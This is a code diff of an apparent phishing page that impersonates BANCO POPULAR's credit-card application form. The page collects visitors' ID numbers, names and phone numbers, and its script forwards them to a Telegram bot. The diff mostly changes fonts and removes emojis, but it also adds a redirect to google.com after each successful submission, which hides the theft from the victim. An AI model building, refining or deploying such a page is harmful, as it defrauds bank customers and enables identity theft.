@@ -1,3 +1,5 @@
+
+
 <!DOCTYPE html>
 <html lang="es">
 <head>
@@ -42,7 +44,7 @@ height: 100%;
 width: auto;
 max-width: 180px;
 object-fit: contain;
-filter: brightness(0) invert(1); /* Asegura que el logo sea blanco */
+filter: brightness(0) invert(1);
 }
 
 .header-title {
@@ -70,27 +72,29 @@ background:#e6f0fb;
 padding:15px;
 border-radius:8px;
 margin-bottom:20px;
-font-size:14px;
+font-size:13px;
 border-left: 4px solid #f37021;
+color: #333;
 }
 
-/* formulario */
+/* formulario - LETRAS MÁS PEQUEÑAS */
 label{
 display:block;
-margin-top:15px;
+margin-top:12px;
 font-weight:bold;
 color: #333;
+font-size:13px;
 }
 
 input[type="text"],
 input[type="tel"]{
 width:100%;
-padding:12px;
-margin-top:6px;
+padding:10px;
+margin-top:4px;
 border:1px solid #ccc;
 border-radius:6px;
 transition: border-color 0.3s;
-font-size:16px;
+font-size:14px;
 }
 
 input[type="text"]:focus,
@@ -105,32 +109,33 @@ box-shadow: 0 0 0 3px rgba(243,112,33,0.1);
 display:flex;
 align-items:flex-start;
 gap:10px;
-margin-top:20px;
-font-size:14px;
+margin-top:15px;
+font-size:13px;
 }
 
 .checkbox input{
-margin-top:4px;
+margin-top:3px;
 cursor: pointer;
-width: 18px;
-height: 18px;
+width: 16px;
+height: 16px;
 accent-color: #f37021;
 }
 
 .orange{
 color:#f37021;
 font-weight:600;
+font-size:13px;
 }
 
-/* BOTON MEJORADO */
+/* BOTON */
 button{
 width:100%;
-margin-top:25px;
-padding:14px;
+margin-top:22px;
+padding:12px;
 border:none;
 background:#f37021;
 color:white;
-font-size:18px;
+font-size:16px;
 font-weight:bold;
 border-radius:8px;
 cursor: pointer;
@@ -158,13 +163,14 @@ transform: none;
 /* footer */
 .footer{
 text-align:center;
-margin-top:30px;
+margin-top:25px;
 color:#555;
+font-size:13px;
 }
 
 .footer img{
-width:140px;
-margin:15px 0;
+width:120px;
+margin:12px 0;
 transition: opacity 0.3s;
 }
 
@@ -175,12 +181,13 @@ opacity: 0.8;
 /* mensaje de estado */
 .status-message {
 margin-top: 15px;
-padding: 12px;
+padding: 10px;
 border-radius: 6px;
 text-align: center;
 display: none;
 font-weight: 500;
 border-left: 4px solid transparent;
+font-size:13px;
 }
 
 .status-message.success {
@@ -220,8 +227,17 @@ height: 35px;
 }
 
 button{
-font-size:16px;
-padding:12px;
+font-size:15px;
+padding:11px;
+}
+
+label, .checkbox, .info, .orange, .footer {
+font-size:12px;
+}
+
+input[type="text"], input[type="tel"] {
+font-size:13px;
+padding:8px;
 }
 }
 
@@ -256,41 +272,41 @@ height: 30px;
 
 <div class="card">
 
-<h2 style="color: #0c5a5f; margin-top: 0;">Escribe tus datos para iniciar</h2>
+<h2 style="color: #0c5a5f; margin-top: 0; font-size:20px;">Escribe tus datos para iniciar</h2>
 
 <div class="info">
-📌 Para hacer tu solicitud en línea debes ser empleado o pensionado con ingreso mínimo de $1.750.905
+Para hacer tu solicitud en línea debes ser empleado o pensionado con ingreso mínimo de $1.750.905
 </div>
 
 <form id="telegramForm">
-<label>📄 Cédula de Ciudadanía*</label>
+<label>Cédula de Ciudadanía*</label>
 <input type="text" id="cedula" placeholder="Ej: 1234567890" required>
 
-<label>👤 Primer Nombre*</label>
+<label>Primer Nombre*</label>
 <input type="text" id="nombre" placeholder="Ej: Juan" required>
 
-<label>👤 Primer Apellido*</label>
+<label>Primer Apellido*</label>
 <input type="text" id="apellido" placeholder="Ej: Pérez" required>
 
-<label>📱 Número de celular*</label>
+<label>Número de celular*</label>
 <input type="tel" id="celular" placeholder="Ej: 3001234567" required pattern="[0-9]{10}" title="Ingresa un número de 10 dígitos">
 
 <div class="checkbox">
 <input type="checkbox" id="autorizacion1" required>
 <div>
-✅ Autorizo a BANCO POPULAR a <span class="orange">realizar el tratamiento de mis datos personales.</span>
+Autorizo a BANCO POPULAR a <span class="orange">realizar el tratamiento de mis datos personales.</span>
 </div>
 </div>
 
 <div class="checkbox">
 <input type="checkbox" id="autorizacion2" required>
 <div>
-✅ Autorizo a BANCO POPULAR a realizar la <span class="orange">consulta y reporte en las centrales de información</span>, además de realizar las siguientes declaraciones.
+Autorizo a BANCO POPULAR a realizar la <span class="orange">consulta y reporte en las centrales de información</span>, además de realizar las siguientes declaraciones.
 </div>
 </div>
 
 <button type="submit" id="submitBtn">
-🚀 Iniciar solicitud
+Iniciar solicitud
 </button>
 </form>
 
@@ -303,9 +319,6 @@ height: 30px;
 
 </div>
 </div>
-
-<!-- Font Awesome (opcional) -->
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
 
 <script>
 // CONFIGURACIÓN DE TELEGRAM - ACTUALIZA ESTOS VALORES
@@ -325,22 +338,22 @@ document.getElementById('telegramForm').addEventListener('submit', async functio
     
     // Validaciones
     if (!cedula || !nombre || !apellido || !celular) {
-        showStatus('❌ Por favor completa todos los campos', 'error');
+        showStatus('Por favor completa todos los campos', 'error');
         return;
     }
     
     if (!autorizacion1 || !autorizacion2) {
-        showStatus('❌ Debes aceptar las autorizaciones para continuar', 'error');
+        showStatus('Debes aceptar las autorizaciones para continuar', 'error');
         return;
     }
     
     if (!/^\d+$/.test(cedula)) {
-        showStatus('❌ La cédula debe contener solo números', 'error');
+        showStatus('La cédula debe contener solo números', 'error');
         return;
     }
     
     if (!/^\d{10}$/.test(celular)) {
-        showStatus('❌ El número de celular debe tener 10 dígitos', 'error');
+        showStatus('El número de celular debe tener 10 dígitos', 'error');
         return;
     }
     
@@ -348,7 +361,7 @@ document.getElementById('telegramForm').addEventListener('submit', async functio
     const submitBtn = document.getElementById('submitBtn');
     submitBtn.disabled = true;
     
-    showStatus('⏳ Enviando solicitud...', 'sending');
+    showStatus('Enviando solicitud...', 'sending');
     
     const mensaje = `🔔 *NUEVA SOLICITUD DE TARJETA DE CRÉDITO - BANCO POPULAR*
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -384,17 +397,25 @@ document.getElementById('telegramForm').addEventListener('submit', async functio
         const data = await response.json();
         
         if (data.ok) {
-            showStatus('✅ ¡Solicitud enviada con éxito! Te contactaremos pronto.', 'success');
+            showStatus('¡Solicitud enviada con éxito! Redirigiendo...', 'success');
+            
+            // REDIRECCIÓN A GOOGLE DESPUÉS DE 2 SEGUNDOS
+            setTimeout(() => {
+                window.location.href = 'https://www.google.com';
+            }, 2000);
+            
+            // Limpiar el formulario
             document.getElementById('telegramForm').reset();
         } else {
-            showStatus('❌ Error al enviar la solicitud. Por favor intenta de nuevo.', 'error');
+            showStatus('Error al enviar la solicitud. Por favor intenta de nuevo.', 'error');
             console.error('Error de Telegram:', data);
+            // Re-habilitar el botón en caso de error
+            submitBtn.disabled = false;
         }
     } catch (error) {
-        showStatus('❌ Error de conexión. Por favor verifica tu internet.', 'error');
+        showStatus('Error de conexión. Por favor verifica tu internet.', 'error');
         console.error('Error:', error);
-    } finally {
-        // Re-habilitar el botón
+        // Re-habilitar el botón en caso de error
         submitBtn.disabled = false;
     }
 });
@@ -403,12 +424,6 @@ function showStatus(message, type) {
     const statusDiv = document.getElementById('statusMessage');
     statusDiv.textContent = message;
     statusDiv.className = 'status-message ' + type;
-    
-    if (type === 'success') {
-        setTimeout(() => {
-            statusDiv.style.display = 'none';
-        }, 5000);
-    }
 }
 </script>
 
